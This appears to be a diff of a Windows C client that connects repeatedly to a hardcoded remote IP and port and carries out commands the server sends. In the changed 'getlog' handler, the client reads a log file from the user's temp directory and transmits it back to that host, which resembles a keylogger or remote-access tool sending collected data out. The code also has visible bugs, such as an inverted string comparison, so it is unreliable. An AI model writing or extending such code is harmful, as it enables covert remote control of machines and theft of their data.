@@ -1,7 +1,10 @@
+#include <windows.h>
 #include <winsock2.h>
-#include <ws2tcpip.h> // Include this header file
+#include <ws2tcpip.h> 
 #include <stdio.h>
 #include <string.h>
+#include <locale.h>
+#include "Commands.c"
 
 // #pragma comment(lib, "ws2_32.lib")
 
@@ -9,24 +12,40 @@
 #define HOST "26.199.90.194"
 #define PORT 12345
 
-int main() {
+void initialzeSocket() {
     WSADATA wsaData;
     WORD ver = MAKEWORD(2, 2);
 
-    int wsResult = WSAStartup(ver, &wsaData); // тут ошибо
+    int wsResult = WSAStartup(ver, &wsaData); 
     if (wsResult != 0) {
         printf("WSAStartup failed: %d\n", wsResult);
-        return 1;
+        exit(1);
     }
+}
 
-    SOCKET clientSocket = INVALID_SOCKET;
-    while (1) {
-        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
-        if (clientSocket == INVALID_SOCKET) {
+void checkSocket(SOCKET clientSocket)  {
+    if (clientSocket == INVALID_SOCKET) {
             printf("Socket failed: %ld\n", WSAGetLastError());
             WSACleanup();
-            return 1;
+            exit(1);
         }
+
+}
+
+int main() {
+    char tempPath[MAX_PATH];
+    GetTempPath(MAX_PATH, tempPath);
+    char buffer[BUFFER_SIZE];
+    char logFilePath[MAX_PATH];
+    sprintf(logFilePath, "%slog.txt", tempPath);
+
+    initialzeSocket();
+
+    SOCKET clientSocket = INVALID_SOCKET;
+
+    while (1) {
+        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+        checkSocket(clientSocket);
 
         struct sockaddr_in serverAddress;
         serverAddress.sin_family = AF_INET;
@@ -68,20 +87,19 @@ int main() {
                 }
 
                 else if (strncmp(buffer, "getlog", 7)) {
-                    char * filename = "log.txt";
-                    char fbuffer[BUFFER_SIZE];
-                    
+                        setlocale(LC_ALL, "Ru");
+                            FILE *fp = fopen(logFilePath, "rb");
+                            if(fp) {
+                                char fbuffer[BUFFER_SIZE];
+                                while (fgets(buffer, BUFFER_SIZE, fp) != NULL) {
+                                    send(clientSocket, buffer, strlen(buffer), 0);
+                                }
 
-                    FILE *fp = fopen(filename, "r");
-                    if(fp) {
-                        
-                        while((fgets(fbuffer, BUFFER_SIZE, fp))!=NULL) {
-                            send(clientSocket, fbuffer, strlen(fbuffer), 0);
-                        }
-                        fclose(fp);
-                        strcpy(message, "Send file log.txt...");
-
-                    }
+                                fclose(fp); 
+                            } 
+                            else {
+                                printf("Unable to open file %s.\n", logFilePath);
+                            }
                 }
                 else {
                     strcpy(message, "Command not found");
